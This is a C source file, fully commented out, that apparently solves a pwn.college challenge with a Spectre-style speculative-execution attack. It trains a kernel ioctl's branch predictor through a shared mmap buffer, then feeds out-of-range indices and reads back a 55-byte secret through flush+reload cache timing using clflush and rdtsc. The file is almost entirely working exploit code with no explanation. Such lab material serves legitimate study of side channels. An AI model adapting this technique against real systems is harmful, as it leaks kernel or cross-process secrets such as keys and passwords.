// #define _GNU_SOURCE
// #include <stdio.h>
// #include <sched.h>
// #include <stdbool.h>
// #include <fcntl.h>
// #include <signal.h>
// #include <sys/wait.h>
// #include <sys/stat.h>
// #include <sys/types.h>
// #include <sys/mman.h>
// #include <sys/ioctl.h>
// #include <unistd.h>
// #include <stdlib.h>
// #include <stdint.h>
// #include <string.h>
// #include <x86intrin.h>
// #include <setjmp.h>

// #define CACHE_HIT_THRESHOLD 220
// #define CACHE_LINE_SIZE 0x1000
// #define BUFF_SIZE 256

// char *shared_buffer;

// void pre_work() {
// 	uint8_t *addr;
// 	for (int i = 0; i < BUFF_SIZE; i++) {
// 		addr = shared_buffer + i * CACHE_LINE_SIZE;
// 		_mm_clflush(addr);
// 	}
// }

// uint64_t time_access_no_flush(void *p) {
// 	uint64_t start, end;
// 	start = __rdtsc();
// 	volatile uint64_t x = *(volatile uint64_t*)p;
// 	_mm_mfence();
// 	end = __rdtsc();
// 	return end - start;
// }

// bool post_work_inner_work(int mix_i) {
// 	uint8_t *addr;
// 	size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
// 	int index;
// 	uint64_t t_no_flush;
// 	index = mix_i * CACHE_LINE_SIZE;
// 	addr = shared_buffer + index;
// 	t_no_flush = time_access_no_flush(addr);
// 	if (t_no_flush < cache_hit_threshold) {
// 		return true;
// 	}
// 	return false;
// }

// int post_work(int *stats) {
// 	for (size_t i = 0; i < BUFF_SIZE; i++) {
// 		int mix_i = ((i * 167) + 13) & 255;
// 		if (post_work_inner_work(mix_i)) {
// 			stats[mix_i]++;
// 		}
// 	}
// }

// void train_target(int fd) {
// 	for (int i = 0; i < 1000; i++) {
// 		int mix_i =  ((i * 167) + 13) & 255;
// 		((volatile int *) shared_buffer)[0] = mix_i % 6;
// 		ioctl(fd, 0, 0);
// 		sched_yield();
// 	}

// 	for (int i = 0; i < 400; i++) {
// 		((volatile int *) shared_buffer)[0] = 0;
// 		sched_yield();
// 	}
// }

// void speculate(int fd, int pos) {
// 	for (int i = 0; i < 300; i++) {
// 		((volatile int *) shared_buffer)[0] = 6 + pos;
// 		ioctl(fd, 0, 0);
// 		sched_yield();
// 	}
// }

// bool unsolved(int *result, int length) {
// 	for (int i = 0; i < length; i++) {
// 		if (result[i] == 0) {
// 			return true;
// 		}
// 	}
// 	return false;
// }

// int exploit(int fd, int len) {
// 	int *results = malloc(sizeof(int) * len);
// 	int max_index = 0;
// 	int max_val = 0;
// 	int stats[255] = {0};

// 	while (unsolved(results, len)) {
// 		for (int i = 0; i < len; i++) {
// 			if (results[i] != '\x00') {
// 				continue;
// 			}
// 			for (int j = 0; j < 255; j++) {
// 				stats[j] = 0;
// 			}
// 			if (!unsolved(results, len)) {
// 				break;
// 			}

// 			// work_loop
// 			for (int j = 0; j < 4000; j++) {
// 				pre_work();
// 				train_target(fd);
// 				pre_work();

// 				speculate(fd, i);
// 				post_work(stats);
// 			}

// 			max_val = 0;
// 			max_index = 0;
// 			for (int j = 20; j < 128; j++) {
// 				if (stats[j] > max_val){
// 					max_index = j;
// 					max_val = stats[j];
// 				}
// 			}

// 			if (max_index != 0 && max_val > 4) {
// 				results[i] = max_index;
// 				//printf("attempted index %d found %d = %c with %d hits\n", i, max_index, max_index, stats[max_index]);
// 			}

// 			printf("Current results\n");
// 			for (int j = 0; j < len; j++) {
// 				printf("index: %d value: %c\n", j, results[j]);
// 			}
// 			for (int l = 0; l < len + 1; l++){
// 				printf("%c", results[l]);
// 			}
// 			puts("\n");
// 		}
// 	}

// 	for (int l = 0; l < len + 1; l++){
// 		printf("%c", results[l]);
// 	}
// }

// void set_affinity() {
// 	cpu_set_t set;
// 	CPU_ZERO(&set);
// 	CPU_SET(2, &set);
// 	sched_setaffinity(0, sizeof(set), &set);
// }

// int main(int argc, char **argv) {
// 	set_affinity();
	
// 	char *challenge = "/proc/pwncollege";
// 	int fd = openat(AT_FDCWD, challenge, O_RDWR);

// 	// mmap
// 	shared_buffer = (char *) mmap(0, 255 * 0x1000, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);

// 	sched_yield();

// 	exploit(fd, 55);

// 	return 0;
// }